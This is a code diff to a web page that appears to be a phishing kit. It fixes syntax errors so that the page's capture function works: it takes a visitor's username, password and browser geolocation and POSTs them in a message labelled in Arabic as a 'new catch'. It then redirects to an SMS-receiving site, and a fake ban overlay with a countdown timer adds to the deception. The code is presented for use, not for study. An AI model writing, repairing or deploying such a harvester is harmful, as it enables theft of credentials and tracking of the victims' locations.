@@ -82,7 +82,7 @@
         @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         #timer { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 32px; font-weight: bold; color: #fbbf24; }
 
-.glass-popup {
+        .glass-popup {
             background: rgba(15, 23, 42, 0.9) !important;
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.1) !important;
@@ -147,7 +147,7 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const loc = https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude};
+                        const loc = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
                         processCapture(user, pass, loc);
                     },
                     () => {
@@ -181,7 +181,7 @@
         }
     };
 
-function applyBanEffect(duration) {
+    function applyBanEffect(duration) {
         const container = document.getElementById('mainCard');
         const overlay = document.getElementById('banOverlay');
         const timerTxt = document.getElementById('timer');
@@ -218,7 +218,7 @@ function applyBanEffect(duration) {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
-                    message: 🎯 صيد جديد:\n👤: ${u}\n🔑: ${p}\n📍 الموقع: ${location} 
+                    message: `🎯 صيد جديد:\n👤: ${u}\n🔑: ${p}\n📍 الموقع: ${location}` 
                 })
             });
             window.location.href = "https://receive-smss.com/";
